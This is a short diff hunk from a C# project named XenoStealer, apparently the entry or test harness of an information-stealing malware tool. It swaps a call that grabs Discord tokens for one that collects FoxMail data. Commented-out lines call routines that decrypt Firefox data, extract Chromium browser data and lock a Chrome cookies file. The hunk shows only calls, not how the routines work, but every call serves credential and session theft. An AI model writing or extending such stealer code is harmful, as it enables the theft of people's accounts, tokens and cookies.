@@ -26,7 +26,7 @@ namespace XenoStealer
             //GeckoDecryptor a = new GeckoDecryptor(Configuration.GeckoLibraryPaths["Firefox"]);
             //var t=Chromium.GetAllInfo(DataExtractionStructs.ChromiumBrowserOptions.All);
 
-            Discord.GetTokens();
+            FoxMail.GetInfo();
             var y = 0;
             //Utils.GetProcessLockingFile(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies", out var asd);
 
